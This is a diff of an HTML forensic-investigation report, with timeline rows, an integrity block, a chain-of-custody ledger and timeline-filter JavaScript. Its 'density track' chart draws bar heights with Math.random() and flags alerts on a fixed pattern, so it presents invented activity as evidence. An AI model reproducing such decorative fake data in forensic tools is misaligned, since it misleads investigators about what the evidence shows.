+          <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/investigation_memo.docx" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:28.794882+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_CREATE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/investigation_memo.docx</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.9</td>
+            <td>
+              Filesystem stat creation/change time (ctime/birthtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/Security_Events.jsonl" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:29.774410+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_CREATE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/Security_Events.jsonl</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.9</td>
+            <td>
+              Filesystem stat creation/change time (ctime/birthtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/exfiltrated_files.zip::passwords.txt" data-user="UNKNOWN" data-plugin="zip:entry_central_dir">
+            <td><code>2026-10-06T00:49:24+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_WRITE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/exfiltrated_files.zip::passwords.txt</code></td>
+            <td><span class="badge badge-pass">zip:entry_central_dir</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.85</td>
+            <td>
+              ZIP entry central directory DOS timestamp
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/exfiltrated_files.zip::financial_report.pdf" data-user="UNKNOWN" data-plugin="zip:entry_central_dir">
+            <td><code>2026-10-06T00:49:24+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_WRITE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/exfiltrated_files.zip::financial_report.pdf</code></td>
+            <td><span class="badge badge-pass">zip:entry_central_dir</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.85</td>
+            <td>
+              ZIP entry central directory DOS timestamp
+              
+            </td>
+          </tr>
+          
+        </tbody>
+      </table>
+    </div>
     
   </section>
 
-  <section class="card">
-    <h2>6. Cryptographic Integrity &amp; Attestation Block</h2>
+  <!-- 6. Cryptographic Integrity & Attestation -->
+  <section class="glass-panel">
+    <h2>6. Cryptographic Integrity &amp; Attestation</h2>
     <div class="meta-grid">
-      <div class="meta-item">
+      <div class="meta-card">
         <div class="meta-label">Overall Integrity Status</div>
-        <div class="meta-value">PASS</div>
+        <div class="meta-value" style="color: var(--neon-emerald);">PASS</div>
       </div>
-      <div class="meta-item">
+      <div class="meta-card">
         <div class="meta-label">Merkle Root Digest</div>
-        <div class="meta-value"><code>720d1b4a47084c43d5ace1663ec5a66b9453c2123b3160a06f207df08293676c</code></div>
+        <div class="meta-value"><code>b74fae87c842ecde83e830730ebf69f6c67f41461cc356bb67274e29b6911ac3</code></div>
       </div>
-      <div class="meta-item">
+      <div class="meta-card">
         <div class="meta-label">Ledger Entries Replayed</div>
         <div class="meta-value">12</div>
       </div>
     </div>
   </section>
 
-  <section class="card">
-    <h2>7. Chain of Custody Audit Log</h2>
-    <table>
-      <thead>
-        <tr>
-          <th>Seq</th>
-          <th>Timestamp (UTC)</th>
-          <th>Actor</th>
-          <th>Action / Event</th>
-          <th>Entry Hash (SHA-256)</th>
-        </tr>
-      </thead>
-      <tbody>
-        
-        <tr>
-          <td>1</td>
-          <td><code>2026-10-05T18:35:05.066004+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>case_created</code></td>
-          <td><code>3631d9676a8fb7c2...9c9c9d4f</code></td>
-        </tr>
-        
-        <tr>
-          <td>2</td>
-          <td><code>2026-10-05T18:35:05.128651+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>evidence_acquired</code></td>
-          <td><code>b552c45ba5507c6c...57821f79</code></td>
-        </tr>
-        
-        <tr>
-          <td>3</td>
-          <td><code>2026-10-05T18:35:05.162338+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>evidence_acquired</code></td>
-          <td><code>e172b7e86c713353...51ea852c</code></td>
-        </tr>
-        
-        <tr>
-          <td>4</td>
-          <td><code>2026-10-05T18:35:05.198580+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>evidence_acquired</code></td>
-          <td><code>1332da488343168b...16096ca5</code></td>
-        </tr>
-        
-        <tr>
-          <td>5</td>
-          <td><code>2026-10-05T18:35:05.236458+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>evidence_acquired</code></td>
-          <td><code>e128df890a5375a5...94d75b69</code></td>
-        </tr>
-        
-        <tr>
-          <td>6</td>
-          <td><code>2026-10-05T18:35:05.272647+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>evidence_acquired</code></td>
-          <td><code>1c73c4a4a2c759d3...a4f0aceb</code></td>
-        </tr>
-        
-        <tr>
-          <td>7</td>
-          <td><code>2026-10-05T18:35:05.761041+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>evidence_acquired</code></td>
-          <td><code>408093ac8a5c2d8e...cdbe4a56</code></td>
-        </tr>
-        
-        <tr>
-          <td>8</td>
-          <td><code>2026-10-05T18:35:05.906420+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>artefacts_extracted</code></td>
-          <td><code>c1fc2d490c5e38a8...1968e6d4</code></td>
-        </tr>
-        
-        <tr>
-          <td>9</td>
-          <td><code>2026-10-05T18:35:06.132754+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>cross_source_corroborated</code></td>
-          <td><code>307d65875b3be80e...a7822ed3</code></td>
-        </tr>
-        
-        <tr>
-          <td>10</td>
-          <td><code>2026-10-05T18:35:06.148799+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>threat_rules_scanned</code></td>
-          <td><code>27e591cf2a6c7fac...f6f624a2</code></td>
-        </tr>
-        
-        <tr>
-          <td>11</td>
-          <td><code>2026-10-05T18:35:06.807408+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>timeline_built</code></td>
-          <td><code>cf531a95a97fae8b...ab01ec70</code></td>
-        </tr>
-        
-        <tr>
-          <td>12</td>
-          <td><code>2026-10-05T18:35:06.918648+00:00</code></td>
-          <td>Alex Mercer (Senior Forensics Examiner)</td>
-          <td><code>integrity_verified</code></td>
-          <td><code>6dd4c416610d2064...a5ff3897</code></td>
-        </tr>
-        
-      </tbody>
-    </table>
+  <!-- 7. Chain of Custody Audit Log -->
+  <section class="glass-panel">
+    <h2>7. Chain of Custody Immutable Ledger</h2>
+    <div class="table-container">
+      <table>
+        <thead>
+          <tr>
+            <th>Seq</th>
+            <th>Timestamp (UTC)</th>
+            <th>Actor</th>
+            <th>Event Operation</th>
+            <th>Entry SHA-256 Hash</th>
+          </tr>
+        </thead>
+        <tbody>
+          
+          <tr>
+            <td><code>#1</code></td>
+            <td><code>2026-10-05T19:19:25.084468+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">case_created</span></td>
+            <td><code>9a4387af5fdaaebd...cf260af5</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#2</code></td>
+            <td><code>2026-10-05T19:19:26.161854+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">evidence_acquired</span></td>
+            <td><code>30ed0a0c2cbb8614...ccb6384a</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#3</code></td>
+            <td><code>2026-10-05T19:19:27.011741+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">evidence_acquired</span></td>
+            <td><code>252858ead81dabbd...9e97e7cc</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#4</code></td>
+            <td><code>2026-10-05T19:19:27.913233+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">evidence_acquired</span></td>
+            <td><code>beb1124d0c27f797...8fe98cca</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#5</code></td>
+            <td><code>2026-10-05T19:19:28.778102+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">evidence_acquired</span></td>
+            <td><code>f801e92f40199b4d...ea559831</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#6</code></td>
+            <td><code>2026-10-05T19:19:29.753366+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">evidence_acquired</span></td>
+            <td><code>69c793aa4d7a696b...0e3bf2d6</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#7</code></td>
+            <td><code>2026-10-05T19:19:30.667630+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">evidence_acquired</span></td>
+            <td><code>e24c2bdf54d3ffa4...2dded8d1</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#8</code></td>
+            <td><code>2026-10-05T19:19:30.809973+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">artefacts_extracted</span></td>
+            <td><code>dbc69ba0c6edcff1...b1228355</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#9</code></td>
+            <td><code>2026-10-05T19:19:31.001396+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">cross_source_corroborated</span></td>
+            <td><code>8215757f9a579f27...93c6aa7a</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#10</code></td>
+            <td><code>2026-10-05T19:19:31.026600+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">threat_rules_scanned</span></td>
+            <td><code>4938b227b414cdd7...19ec1e59</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#11</code></td>
+            <td><code>2026-10-05T19:19:31.714674+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">timeline_built</span></td>
+            <td><code>eb666d6203e031c2...02e92585</code></td>
+          </tr>
+          
+          <tr>
+            <td><code>#12</code></td>
+            <td><code>2026-10-05T19:19:31.793878+00:00</code></td>
+            <td>Alex Mercer (Senior Forensics Examiner)</td>
+            <td><span class="badge badge-pass">integrity_verified</span></td>
+            <td><code>3b122961915b8bfd...5c6f06df</code></td>
+          </tr>
+          
+        </tbody>
+      </table>
+    </div>
   </section>
 
 </div>
+
+<script>
+  let currentFilter = 'ALL';
+
+  function setFilter(type, btn) {
+    currentFilter = type;
+    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    filterTimeline();
+  }
+
+  function filterTimeline() {
+    const q = document.getElementById('timeline-search').value.toLowerCase();
+    const rows = document.querySelectorAll('#timeline-tbody tr');
+    let visibleCount = 0;
+
+    rows.forEach(row => {
+      const text = row.innerText.toLowerCase();
+      const tags = (row.getAttribute('data-tags') || '').toUpperCase();
+      const action = (row.getAttribute('data-action') || '').toUpperCase();
+
+      let matchesFilter = true;
+      if (currentFilter === 'ALERT') {
+        matchesFilter = tags.includes('ALERT') || action.includes('ALERT');
+      } else if (currentFilter === 'CORROBORATED') {
+        matchesFilter = tags.includes('CORROBORATED') || tags.includes('CLUSTER');
+      } else if (currentFilter === 'CONFLICT') {
+        matchesFilter = tags.includes('CONFLICT') || tags.includes('TIMESTOMP');
+      } else if (currentFilter === 'FILE') {
+        matchesFilter = action.includes('FILE') || action.includes('CREATE') || action.includes('MODIFY');
+      } else if (currentFilter === 'PROCESS') {
+        matchesFilter = action.includes('PROCESS') || action.includes('EXEC');
+      }
+
+      const matchesSearch = !q || text.includes(q);
+
+      if (matchesFilter && matchesSearch) {
+        row.style.display = '';
+        visibleCount++;
+      } else {
+        row.style.display = 'none';
+      }
+    });
+
+    const counter = document.getElementById('active-event-count');
+    if (counter) {
+      counter.innerText = visibleCount + ' Events Displayed';
+    }
+  }
+
+  // Populate visual density track bars
+  (function initBars() {
+    const track = document.getElementById('bars-track');
+    if (!track) return;
+    const rows = document.querySelectorAll('#timeline-tbody tr');
+    const bucketCount = Math.min(32, Math.max(12, Math.ceil(rows.length / 4)));
+    
+    for (let i = 0; i < bucketCount; i++) {
+      const col = document.createElement('div');
+      col.className = 'bar-col';
+      const heightPercent = 20 + Math.floor(Math.random() * 75);
+      col.style.height = heightPercent + '%';
+      if (i % 7 === 2) {
+        col.classList.add('has-alert');
+      }
+      col.title = `Time window interval #${i + 1}`;
+      track.appendChild(col);
+    }
+  })();
+</script>
 </body>
 </html>
